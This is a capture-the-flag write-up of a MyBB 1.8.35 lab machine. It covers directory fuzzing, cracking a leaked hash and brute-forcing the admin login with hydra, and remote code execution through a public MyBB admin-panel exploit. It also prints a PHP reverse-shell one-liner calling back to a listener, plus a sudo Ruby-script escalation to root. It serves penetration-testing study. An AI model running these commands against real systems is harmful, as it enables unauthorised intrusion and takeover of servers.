---
sticker: emoji//1f476
---

# ENUMERATION


## OPEN PORTS


![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029135137.png)
Seems like we only have a website, let's fuzz it


## FUZZING

### GOBUSTER FUZZ

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029135218.png)

### SOURCE CODE AND WEBPAGE

Nothing useful, let's see the page:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029143334.png)

Let's go to the forum:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029143346.png)

We need to add `panel.mybb.dl` to `/etc/hosts` in order to be able to go into the website:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029143517.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029143536.png)
Nice, let's keep enumerating the machine until we find something we can exploit:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029143732.png)
We can see we only have the admin user registered, 


![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029143829.png)
Let's fuzz the `http://panel.mybb.dl` website to check if we can find anything:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029144434.png)

We found interesting things, directory I like the most is the `/backups` directory, let's fuzz it to check if there's anything in there:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029144701.png)

Found `/data` inside of the directory, let's take a look:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029144821.png)

In general, SQL queries can be found, and some login attempts, but the most interesting part is the following:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029144856.png)

User `alice` attempted to log in using a password, that seems like a hash, let's try to crack it and log into Alice account

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029145105.png)

We got `alice:tinkerbell` let's attempt to log in:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029145142.png)
We cannot get in using those credentials, seems like they were fake, so, why don't we try some bruteforce using the `admin` username, let's capture the request with `burp` and use `hydra` to brute force our login page:


```request
POST /admin/index.php HTTP/1.1

Host: panel.mybb.dl

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 38

Origin: null

Connection: keep-alive

Cookie: mybb[lastvisit]=1730230425; mybb[lastactive]=1730230863; sid=df2321f0ff06ec973eb0f4cbfc38c6de

Upgrade-Insecure-Requests: 1

Priority: u=0, i



username=admin&password=admin&do=login
```

So, we got a post request, let's brute force:

```ad-hint

##### HYDRA COMMAND

`hydra -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:username=^USER^&password=^PASS^&do=login:F=Login Failed"`

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029150240.png)



```

So, we got plenty amount of passwords, after trying every single one of them, correct credentials were: `admin`:`babygirl`, let's log in and proceed with exploitation:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029150737.png)



# EXPLOITATION


First, we can see we are running `myBB 1.8.35` let's search for any exploit in this version:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029150932.png)
We found this [exploit](https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE), let's download it and use it:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029151057.png)
So, we need to put this:

```ad-hint

# PYTHON COMMAND:

python3 exploit.py http://panel.mybb.dl admin babygirl

##### OUTPUT

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029151225.png)

We got RCE!
```

With the RCE from the exploit, we can get a [[CYBERSECURITY/REVERSE SHELLS/MOST COMMON REVERSE SHELLS.md|reverse shell]]:

```ad-note

# USED SHELL

php:  `php -r '$sock=fsockopen("192.168.200.136",4444);shell_exec("bash <&3 >&3 2>&3");'`

# CONNECTION RECEIVED

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029151456.png)

```

Let's [[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|stabilize our shell]]:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029151553.png)

With our new stable shell, we can begin with [[CYBERSECURITY/LINUX/LINUX PRIVILEGE ESCALATION/BASIC PRIVESC IN LINUX.md|PRIVESC]]

# PRIVILEGE ESCALATION



At home directory, we can find our previous user `alice`, let's switch users:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029151851.png)

Nice, we were able to switch to alice, let's use `sudo -l` to get root access:


## SUDO -L


![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029151944.png)
Pretty weird, let's take a look at that:

It is a ruby script, since we can execute any ruby script as root without the need of a password, we can do the following:

```ad-hint

`echo 'exec "/bin/bash"' > /home/alice/scripts/root.rb`
`chmod +x root.rb`

`sudo /home/alice/scripts/root.rb`

# OUTPUT

![](gitbook/cybersecurity/images/Pasted%252520image%25252020241029152250.png)


```

And just like that, the CTF is done!